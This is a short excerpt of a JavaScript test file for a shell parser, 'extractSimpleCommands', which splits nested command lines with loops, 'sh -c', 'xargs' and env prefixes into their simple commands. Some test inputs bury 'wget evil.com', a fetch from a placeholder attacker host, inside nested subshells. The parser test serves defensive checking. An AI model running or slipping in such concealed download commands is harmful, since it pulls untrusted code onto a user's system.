...
describe('extractSimpleCommands', () => {
  ...
  describe('nested complex combinations', () => {
    it.each([
      // time + env vars + while + sh -c
      {
        commandLine:
          "ENV=prod time while true; do sh -c 'echo loop && wget evil.com'; done",
        expected: ['true', 'echo loop', 'wget evil.com'],
      },
      ...
      // All features combined in maximum complexity
      {
        commandLine:
          "ENV=prod time while true; do for i in 1 2; do echo $i | FOO=bar xargs sh -c 'time grep ok && wget evil.com'; done && sh -c 'rm temp'; done",
        expected: ['true', 'echo $i', 'grep ok', 'wget evil.com', 'rm temp'],
      },
